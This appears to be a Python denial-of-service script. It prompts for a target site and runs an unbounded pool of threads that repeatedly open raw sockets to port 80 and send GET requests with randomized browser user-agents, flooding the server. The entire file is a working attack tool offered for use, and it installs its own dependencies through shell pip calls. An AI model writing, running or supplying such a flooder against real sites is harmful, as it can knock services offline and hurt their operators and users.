import os
try:
    import requests
    import json
    from fake_useragent import UserAgent
    from threading import Thread
    import socket
    import queue

except ModuleNotFoundError:
    os.system("pip install requests")
    os.system("pip install fake_useragent")
    exec(open(__file__, "r", encoding="utf-8").read())



red     = "\033[91m"
green   = "\033[92m"
yellow  = "\033[93;1m"
blue    = "\033[94m"
magenta = "\033[95m"
cyan    = "\033[96m"
white   = "\033[1;37m"
__AUTHOR__ = ["Le Viet Hung"]


queue_data = {
    "output" : queue.Queue(),
    "thread" : queue.Queue()
}


class Traffic:
    def __init__(self, site):
        self.default_port = 80
        self.site = site
        # self.checking()
        self.dataset()
        os.system(f"title Total thread : {self.dataset['thread']}")

    def dataset(self):
        self.dataset = open("config.js", "r", encoding="utf-8").read()
        self.dataset = json.loads(self.dataset)

    def checking(self):
        if self.site[:4] != "http":#https
            print(f"{red}[ERROR] : {magenta}Wrong format {white}({cyan}https://<site>.<domain>{white})")
            return self.quit()
        

    def quit(self):
        input("----- press enter to exit ------\n")
        raise SystemExit
    
    def rua(self):
        ua = UserAgent(platforms="pc")
        return ua.random

    def fetch(self, thread_id):
        print(f"{red}[{white}Thread id{red}] : {magenta}{thread_id} {yellow}| {magenta}{self.site}")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.site, self.default_port))
            ua = self.rua()
            request = f"""
                GET / HTTP/1.1\r\n
                accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n
                Host: {self.site}\r\n
                dnt: 1\r\n
                Connection: keep-alive\r\n
                User-Agent: {ua}\r\n
                \r\n
            """
            s.sendall(request.encode())
            response = b""
            while True:
                data = s.recv(1024)
                if not data:
                    break
                response += data

    def multithreading(self):
        thread_arr = [None for i in range(self.dataset["thread"])]  
        index = 0
        while True:
            try:
                if (thread_arr[index] == None) or (not thread_arr[index].is_alive()):
                    thread_arr[index] = Thread(target = self.fetch, args = (index,))
                    thread_arr[index].start()
            except IndexError:
                index = 0
                continue
            index += 1

if __name__ == "__main__":
    os.system("cls")
    Traffic(input("Enter url :")).multithreading()